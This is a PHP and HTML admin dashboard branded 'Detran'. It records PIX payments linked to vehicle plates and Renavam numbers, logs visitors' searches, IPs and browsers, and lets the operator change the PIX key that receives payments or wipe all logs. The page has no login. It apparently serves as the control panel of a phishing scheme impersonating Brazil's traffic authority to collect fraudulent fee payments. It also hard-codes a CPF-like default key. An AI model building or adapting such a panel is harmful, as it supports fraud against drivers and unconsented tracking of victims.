<?php
date_default_timezone_set('America/Sao_Paulo');
$cfgPath = __DIR__ . 'api/pix_config.json';
$pixLogPath = __DIR__ . 'api/pix_log.json';
$searchLogPath = __DIR__ . 'api/search_log.json';
$clickStatsPath = __DIR__ . 'api/click_stats.json';

$msg = isset($_GET['msg']) ? (string)$_GET['msg'] : '';

// --- ACTIONS ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['reset_stats']) && $_POST['reset_stats'] === '1') {
        @file_put_contents($pixLogPath, json_encode([], JSON_PRETTY_PRINT));
        @file_put_contents($searchLogPath, json_encode([], JSON_PRETTY_PRINT));
        @file_put_contents($clickStatsPath, json_encode(['consultar_clicks'=>0,'enter_clicks'=>0], JSON_PRETTY_PRINT));
        header('Location: api/admin.php?msg=' . urlencode('Todos os logs e estatísticas foram limpos.'));
        exit;
    } elseif (isset($_POST['pixKey'])) {
        $pixKey = trim((string)$_POST['pixKey']);
        if ($pixKey !== '') {
            $cfg = ['pixKey' => $pixKey];
            @file_put_contents($cfgPath, json_encode($cfg, JSON_PRETTY_PRINT));
            header('Location: api/admin.php?msg=' . urlencode('Chave PIX atualizada com sucesso.'));
            exit;
        } else {
            header('Location: api/admin.php?msg=' . urlencode('Chave PIX inválida.'));
            exit;
        }
    }
}

// --- DATA LOADING ---
$currentKey = '06721661195';
if (file_exists($cfgPath)) {
    $cfg = json_decode(@file_get_contents($cfgPath), true);
    if (isset($cfg['pixKey']) && $cfg['pixKey'] !== '') {
        $currentKey = $cfg['pixKey'];
    }
}

$pixEntries = [];
if (file_exists($pixLogPath)) {
    $pixEntries = json_decode(@file_get_contents($pixLogPath), true) ?? [];
    // Sort by date desc
    usort($pixEntries, function($a, $b) {
        return strtotime($b['ts']) - strtotime($a['ts']);
    });
}

$searchEntries = [];
if (file_exists($searchLogPath)) {
    $searchEntries = json_decode(@file_get_contents($searchLogPath), true) ?? [];
    // Sort by date desc
    usort($searchEntries, function($a, $b) {
        return strtotime($b['ts'] ?? 0) - strtotime($a['ts'] ?? 0);
    });
}

$clickStats = ['consultar_clicks' => 0, 'enter_clicks' => 0];
if (file_exists($clickStatsPath)) {
    $clickStats = json_decode(@file_get_contents($clickStatsPath), true) ?? $clickStats;
}

// --- HELPER FUNCTIONS ---
function parse_ua($ua) {
    $device = 'Desktop';
    $icon = '💻'; // Desktop icon
    
    if (preg_match('/(android|iphone|ipad|mobile)/i', $ua)) {
        $device = 'Celular';
        $icon = '📱'; // Mobile icon
    } elseif (preg_match('/tablet/i', $ua)) {
        $device = 'Tablet';
        $icon = '📱';
    }

    $browser = 'Desconhecido';
    if (preg_match('/chrome/i', $ua) && !preg_match('/edge/i', $ua)) $browser = 'Chrome';
    elseif (preg_match('/firefox/i', $ua)) $browser = 'Firefox';
    elseif (preg_match('/safari/i', $ua) && !preg_match('/chrome/i', $ua)) $browser = 'Safari';
    elseif (preg_match('/edge/i', $ua)) $browser = 'Edge';
    elseif (preg_match('/opera|opr/i', $ua)) $browser = 'Opera';
    elseif (preg_match('/msie|trident/i', $ua)) $browser = 'IE';

    return ['type' => $device, 'browser' => $browser, 'icon' => $icon];
}

function time_elapsed_string($datetime, $full = false) {
    $now = new DateTime;
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);

    $diff->w = floor($diff->d / 7);
    $diff->d -= $diff->w * 7;

    $string = array(
        'y' => 'ano',
        'm' => 'mês',
        'w' => 'semana',
        'd' => 'dia',
        'h' => 'hora',
        'i' => 'minuto',
        's' => 'segundo',
    );
    foreach ($string as $k => &$v) {
        if ($diff->$k) {
            $v = $diff->$k . ' ' . $v . ($diff->$k > 1 ? 's' : '');
        } else {
            unset($string[$k]);
        }
    }

    if (!$full) $string = array_slice($string, 0, 1);
    return $string ? implode(', ', $string) . ' atrás' : 'agora mesmo';
}

// Stats Calculation
$totalPixValue = 0;
foreach ($pixEntries as $p) $totalPixValue += ($p['valor'] ?? 0);

$uniqueIps = [];
foreach ($searchEntries as $s) if (isset($s['ip'])) $uniqueIps[$s['ip']] = true;
foreach ($pixEntries as $p) if (isset($p['ip'])) $uniqueIps[$p['ip']] = true;
$totalUniqueVisitors = count($uniqueIps);

?>
<!doctype html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Administrativo - Detran</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #f3f4f6; }
        .card { background: white; border-radius: 0.75rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); }
        .table-row-hover:hover { background-color: #f9fafb; }
        .status-badge { padding: 0.25rem 0.625rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 500; }
        .badge-success { background-color: #d1fae5; color: #065f46; }
        .badge-blue { background-color: #dbeafe; color: #1e40af; }
    </style>
</head>
<body class="text-gray-800">

<div class="min-h-screen flex flex-col">
    <!-- Navbar -->
    <nav class="bg-white shadow-sm border-b border-gray-200">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between h-16">
                <div class="flex items-center">
                    <i class="fas fa-shield-alt text-blue-600 text-2xl mr-3"></i>
                    <span class="font-bold text-xl text-gray-900">Admin Dashboard</span>
                </div>
                <div class="flex items-center space-x-4">
                    <div class="text-sm text-gray-500">
                        <i class="fas fa-clock mr-1"></i> <?php echo date('d/m/Y H:i'); ?>
                    </div>
                </div>
            </div>
        </div>
    </nav>

    <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8">
        
        <?php if ($msg): ?>
            <div class="mb-6 p-4 rounded-md <?php echo strpos($msg, 'sucesso') !== false || strpos($msg, 'limpos') !== false ? 'bg-green-50 text-green-700 border border-green-200' : 'bg-red-50 text-red-700 border border-red-200'; ?> flex items-center shadow-sm">
                <i class="fas <?php echo strpos($msg, 'sucesso') !== false || strpos($msg, 'limpos') !== false ? 'fa-check-circle' : 'fa-exclamation-circle'; ?> mr-3 text-lg"></i>
                <?php echo htmlspecialchars($msg); ?>
            </div>
        <?php endif; ?>

        <!-- Stats Grid -->
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <!-- Card 1 -->
            <div class="card p-6 border-l-4 border-blue-500">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-sm font-medium text-gray-500">Total PIX Gerado</p>
                        <p class="text-2xl font-bold text-gray-900 mt-1">R$ <?php echo number_format($totalPixValue, 2, ',', '.'); ?></p>
                    </div>
                    <div class="p-3 bg-blue-50 rounded-full text-blue-600">
                        <i class="fas fa-dollar-sign text-xl"></i>
                    </div>
                </div>
                <div class="mt-4 text-xs text-gray-500">
                    <span class="text-green-600 font-medium"><i class="fas fa-arrow-up"></i> <?php echo count($pixEntries); ?></span> transações
                </div>
            </div>

            <!-- Card 2 -->
            <div class="card p-6 border-l-4 border-green-500">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-sm font-medium text-gray-500">Buscas Realizadas</p>
                        <p class="text-2xl font-bold text-gray-900 mt-1"><?php echo count($searchEntries); ?></p>
                    </div>
                    <div class="p-3 bg-green-50 rounded-full text-green-600">
                        <i class="fas fa-search text-xl"></i>
                    </div>
                </div>
                <div class="mt-4 text-xs text-gray-500">
                    Consultas de placa/renavam
                </div>
            </div>

            <!-- Card 3 -->
            <div class="card p-6 border-l-4 border-purple-500">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-sm font-medium text-gray-500">Visitantes Únicos</p>
                        <p class="text-2xl font-bold text-gray-900 mt-1"><?php echo $totalUniqueVisitors; ?></p>
                    </div>
                    <div class="p-3 bg-purple-50 rounded-full text-purple-600">
                        <i class="fas fa-users text-xl"></i>
                    </div>
                </div>
                <div class="mt-4 text-xs text-gray-500">
                    Baseado em IP
                </div>
            </div>

            <!-- Card 4 -->
            <div class="card p-6 border-l-4 border-orange-500">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-sm font-medium text-gray-500">Acessos à Página</p>
                        <p class="text-2xl font-bold text-gray-900 mt-1"><?php echo $clickStats['enter_clicks'] ?? 0; ?></p>
                    </div>
                    <div class="p-3 bg-orange-50 rounded-full text-orange-600">
                        <i class="fas fa-mouse-pointer text-xl"></i>
                    </div>
                </div>
                <div class="mt-4 text-xs text-gray-500">
                    Cliques em "Consultar" (Home): <b><?php echo $clickStats['consultar_clicks'] ?? 0; ?></b>
                </div>
            </div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
            
            <!-- Left Column: Logs -->
            <div class="lg:col-span-2 space-y-8">
                
                <!-- PIX Logs Section -->
                <div class="card overflow-hidden">
                    <div class="px-6 py-4 border-b border-gray-100 flex justify-between items-center bg-gray-50">
                        <h3 class="font-bold text-gray-800"><i class="fas fa-receipt mr-2 text-blue-600"></i>Últimos PIX Gerados</h3>
                        <span class="text-xs font-medium bg-blue-100 text-blue-800 py-1 px-2 rounded-full"><?php echo count($pixEntries); ?> registros</span>
                    </div>
                    <div class="overflow-x-auto">
                        <table class="w-full text-sm text-left">
                            <thead class="text-xs text-gray-500 uppercase bg-gray-50 border-b">
                                <tr>
                                    <th class="px-6 py-3">Data</th>
                                    <th class="px-6 py-3">Veículo</th>
                                    <th class="px-6 py-3">Valor</th>
                                    <th class="px-6 py-3">IP / Dispositivo</th>
                                </tr>
                            </thead>
                            <tbody class="divide-y divide-gray-100">
                                <?php if (empty($pixEntries)): ?>
                                    <tr><td colspan="4" class="px-6 py-8 text-center text-gray-500">Nenhum registro encontrado.</td></tr>
                                <?php else: ?>
                                    <?php foreach (array_slice($pixEntries, 0, 10) as $pix): 
                                        $uaInfo = parse_ua($pix['ua'] ?? '');
                                    ?>
                                    <tr class="table-row-hover transition-colors">
                                        <td class="px-6 py-4">
                                            <div class="font-medium text-gray-900"><?php echo date('d/m/Y', strtotime($pix['ts'])); ?></div>
                                            <div class="text-xs text-gray-500"><?php echo date('H:i:s', strtotime($pix['ts'])); ?></div>
                                        </td>
                                        <td class="px-6 py-4">
                                            <div class="font-medium text-gray-900"><?php echo htmlspecialchars($pix['placa'] ?: 'N/A'); ?></div>
                                            <div class="text-xs text-gray-500"><?php echo htmlspecialchars($pix['renavam'] ?: 'Renavam N/A'); ?></div>
                                            <div class="text-xs text-gray-400 mt-1"><?php echo htmlspecialchars(substr($pix['descricao'], 0, 20)); ?>...</div>
                                        </td>
                                        <td class="px-6 py-4">
                                            <span class="status-badge badge-success">
                                                <?php echo htmlspecialchars($pix['valor_brl']); ?>
                                            </span>
                                        </td>
                                        <td class="px-6 py-4">
                                            <div class="flex items-center gap-2 mb-1">
                                                <span class="font-mono text-xs bg-gray-100 px-2 py-1 rounded"><?php echo htmlspecialchars($pix['ip'] ?? 'N/A'); ?></span>
                                            </div>
                                            <div class="text-xs text-gray-500 flex items-center gap-1">
                                                <span><?php echo $uaInfo['icon']; ?></span>
                                                <span><?php echo $uaInfo['type']; ?></span>
                                                <span class="text-gray-300">|</span>
                                                <span><?php echo $uaInfo['browser']; ?></span>
                                            </div>
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                    <?php if (count($pixEntries) > 10): ?>
                    <div class="px-6 py-3 bg-gray-50 border-t border-gray-100 text-center">
                        <button class="text-sm text-blue-600 font-medium hover:text-blue-800">Ver todos os registros</button>
                    </div>
                    <?php endif; ?>
                </div>

                <!-- Search Logs Section -->
                <div class="card overflow-hidden">
                    <div class="px-6 py-4 border-b border-gray-100 flex justify-between items-center bg-gray-50">
                        <h3 class="font-bold text-gray-800"><i class="fas fa-search mr-2 text-green-600"></i>Histórico de Buscas</h3>
                        <span class="text-xs font-medium bg-green-100 text-green-800 py-1 px-2 rounded-full"><?php echo count($searchEntries); ?> registros</span>
                    </div>
                    <div class="overflow-x-auto">
                        <table class="w-full text-sm text-left">
                            <thead class="text-xs text-gray-500 uppercase bg-gray-50 border-b">
                                <tr>
                                    <th class="px-6 py-3">Tempo</th>
                                    <th class="px-6 py-3">Consulta</th>
                                    <th class="px-6 py-3">IP / Navegador</th>
                                </tr>
                            </thead>
                            <tbody class="divide-y divide-gray-100">
                                <?php if (empty($searchEntries)): ?>
                                    <tr><td colspan="3" class="px-6 py-8 text-center text-gray-500">Nenhuma busca registrada ainda.</td></tr>
                                <?php else: ?>
                                    <?php foreach (array_slice($searchEntries, 0, 10) as $search): 
                                        $uaInfo = parse_ua($search['ua'] ?? '');
                                    ?>
                                    <tr class="table-row-hover transition-colors">
                                        <td class="px-6 py-4 whitespace-nowrap">
                                            <div class="text-sm font-medium text-gray-900"><?php echo time_elapsed_string($search['ts']); ?></div>
                                            <div class="text-xs text-gray-400"><?php echo date('d/m H:i', strtotime($search['ts'])); ?></div>
                                        </td>
                                        <td class="px-6 py-4">
                                            <div class="flex items-center gap-3">
                                                <div class="bg-gray-100 p-2 rounded text-center min-w-[80px]">
                                                    <div class="text-xs text-gray-500 uppercase">Placa</div>
                                                    <div class="font-bold text-gray-900"><?php echo htmlspecialchars($search['plate'] ?? '-'); ?></div>
                                                </div>
                                                <div class="text-xs text-gray-500">
                                                    <div>Renavam: <span class="font-mono text-gray-700"><?php echo htmlspecialchars($search['renavam'] ?? '-'); ?></span></div>
                                                </div>
                                            </div>
                                        </td>
                                        <td class="px-6 py-4">
                                            <div class="flex items-center gap-2 mb-1">
                                                <span class="font-mono text-xs bg-gray-100 px-2 py-1 rounded"><?php echo htmlspecialchars($search['ip'] ?? 'N/A'); ?></span>
                                            </div>
                                            <div class="text-xs text-gray-500 flex items-center gap-1">
                                                <span title="<?php echo $uaInfo['type']; ?>"><?php echo $uaInfo['icon']; ?></span>
                                                <span><?php echo $uaInfo['browser']; ?></span>
                                            </div>
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>

            </div>

            <!-- Right Column: Config & Tools -->
            <div class="space-y-8">
                
                <!-- Config Card -->
                <div class="card p-6">
                    <h3 class="font-bold text-gray-800 mb-4 flex items-center"><i class="fas fa-cog mr-2 text-gray-600"></i>Configurações</h3>
                    
                    <form method="post" class="space-y-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Chave PIX Recebedora</label>
                            <div class="flex rounded-md shadow-sm">
                                <span class="inline-flex items-center px-3 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-500 text-sm">
                                    <i class="fas fa-key"></i>
                                </span>
                                <input type="text" name="pixKey" value="<?php echo htmlspecialchars($currentKey); ?>" class="flex-1 min-w-0 block w-full px-3 py-2 rounded-none rounded-r-md border border-gray-300 focus:ring-blue-500 focus:border-blue-500 sm:text-sm" placeholder="CPF, Email, Telefone...">
                            </div>
                            <p class="mt-1 text-xs text-gray-500">Chave para onde serão enviados os pagamentos.</p>
                        </div>
                        <button type="submit" class="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors">
                            Salvar Alterações
                        </button>
                    </form>
                </div>

                <!-- Danger Zone -->
                <div class="card p-6 border-t-4 border-red-500">
                    <h3 class="font-bold text-red-600 mb-4 flex items-center"><i class="fas fa-exclamation-triangle mr-2"></i>Área de Perigo</h3>
                    <p class="text-sm text-gray-600 mb-4">Esta ação irá apagar permanentemente todos os registros de buscas, logs de PIX e contadores de cliques.</p>
                    
                    <form method="post" onsubmit="return confirm('Tem certeza absoluta? Todos os dados serão perdidos.');">
                        <input type="hidden" name="reset_stats" value="1">
                        <button type="submit" class="w-full flex justify-center py-2 px-4 border border-red-300 rounded-md shadow-sm text-sm font-medium text-red-700 bg-white hover:bg-red-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 transition-colors">
                            <i class="fas fa-trash-alt mr-2 mt-0.5"></i> Limpar Todos os Dados
                        </button>
                    </form>
                </div>

                <!-- System Info -->
                <div class="card p-6 bg-gray-50">
                    <h3 class="font-bold text-gray-800 mb-3 text-sm uppercase tracking-wide">Info do Sistema</h3>
                    <ul class="text-xs space-y-2 text-gray-600">
                        <li class="flex justify-between"><span>PHP Version:</span> <span class="font-mono"><?php echo phpversion(); ?></span></li>
                        <li class="flex justify-between"><span>Server IP:</span> <span class="font-mono"><?php echo $_SERVER['SERVER_ADDR'] ?? 'Localhost'; ?></span></li>
                        <li class="flex justify-between"><span>Client IP:</span> <span class="font-mono"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></li>
                        <li class="flex justify-between"><span>Log PIX Size:</span> <span class="font-mono"><?php echo file_exists($pixLogPath) ? round(filesize($pixLogPath)/1024, 1) . ' KB' : '0 KB'; ?></span></li>
                    </ul>
                </div>

            </div>
        </div>
    </main>
</div>

</body>
</html>
